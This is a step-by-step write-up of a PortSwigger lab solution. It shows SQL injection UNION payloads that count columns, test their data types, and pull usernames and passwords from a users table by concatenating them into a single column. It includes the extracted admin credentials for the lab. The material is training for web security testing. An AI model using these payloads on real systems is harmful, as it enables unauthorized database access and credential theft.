## Lab: SQL Injection UNION Attack – Retrieving Multiple Values in a Single Column - [Link](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)


### Step-by-Step Process

#### 1. Capture the Request

* Access the lab
* Open Burp Suite → Proxy → Intercept → Capture the request


#### 2. Determine the Number of Columns

Inject:

```
' ORDER BY 1--         (OK)  
' ORDER BY 2--         (OK)  
' ORDER BY 3--         (Error)
```

Conclusion: The query returns **2 columns**.


#### 3. Determine Column Data Types

Test:

```
' UNION SELECT NULL,NULL--            (OK)  
' UNION SELECT 'a',NULL--             (Error)  
' UNION SELECT NULL,'a'--             (OK)
```

Conclusion:

* Column 1: Integer
* Column 2: String (textual data)


#### 4. Retrieve Data Individually

Inject:

```
' UNION SELECT NULL,username FROM users--      → administrator  
' UNION SELECT NULL,password FROM users--      → 6u3occwm4l1stwy79smj
```

or

#### 5. Retrieve Multiple Values in a Single Column

Inject:

```
' UNION SELECT NULL,username || ',' || password FROM users--
```

Output:

```
administrator,6u3occwm4l1stwy79smj
```


#### 6. Log in

* Go to "My Account"
* Use the retrieved credentials

**Lab Solved**

